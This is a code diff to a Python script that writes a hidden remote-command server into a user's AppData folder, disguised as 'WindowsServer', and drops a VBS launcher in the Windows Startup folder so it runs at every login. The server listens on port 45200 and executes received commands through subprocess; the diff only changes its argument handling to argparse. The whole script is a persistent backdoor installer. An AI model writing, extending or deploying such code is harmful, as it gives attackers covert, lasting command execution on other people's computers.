@@ -7,11 +7,21 @@ startup_path = fr"C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/P
 cwd = os.getcwd()
 server_content = r'''
 import socket
-import sys
+import argparse
 import subprocess
 import os
-host = "0.0.0.0"
-port = int(sys.argv[1])
+
+# created an argument parser object
+parser = argparse.ArgumentParser(description="this program is made by DARWIN!!")
+
+# added some required arguments
+parser.add_argument("-i","--ip",required=True,help="ip address to connect to!")
+parser.add_argument("-p","--port",required=True,type=int,help="prot number to connect to!")
+
+# making an object for reading the input
+args = parser.parse_args()
+host = args.ip
+port = args.port
 
 def send_exe(command,conn):
     process = subprocess.Popen(command,
@@ -65,7 +75,7 @@ client.close()
 conn.close()
 
 '''
-batch_content = fr'''"{sys.executable}" "C:/Users/{user}/WindowsServer/server.py" 45200'''
+batch_content = fr'''"{sys.executable}" "C:/Users/{user}/WindowsServer/server.py" -i 0.0.0.0 -p 45200'''
 
 
 vbs_content = fr'''
@@ -86,6 +96,7 @@ with open("server.bat",'w') as f:
 os.chdir(startup_path)
 with open("winServ.vbs",'w') as f:
     f.write(vbs_content)
+
 
 
 
